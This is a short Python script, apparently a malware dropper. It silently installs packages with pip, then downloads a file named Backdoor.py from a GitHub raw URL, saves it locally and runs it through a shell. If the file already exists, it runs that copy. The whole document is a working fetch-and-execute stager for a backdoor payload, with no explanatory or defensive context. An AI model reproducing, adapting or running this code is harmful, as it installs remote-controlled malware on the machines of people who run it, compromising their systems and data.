try:
    import winshell
    from win32com.client import Dispatch
    import requests
    import os
    import shutil
    import subprocess
    import sys
except ImportError or ModuleNotFoundError:
    import subprocess
    subprocess.check_call(["python", "-m", "pip", "install", "requests", "winshell", "pywin32", "pyinstaller"])
    import requests
    import os

if os.path.exists("Backdoor.py"):
    subprocess.Popen("Backdoor.py", shell=True)
else:
    code = requests.get("https://raw.githubusercontent.com/thompog/d/refs/heads/main/Backdoor.py")

    with open("Backdoor.py", "w") as f:
        f.write(code.text)

    subprocess.Popen("Backdoor.py", shell=True)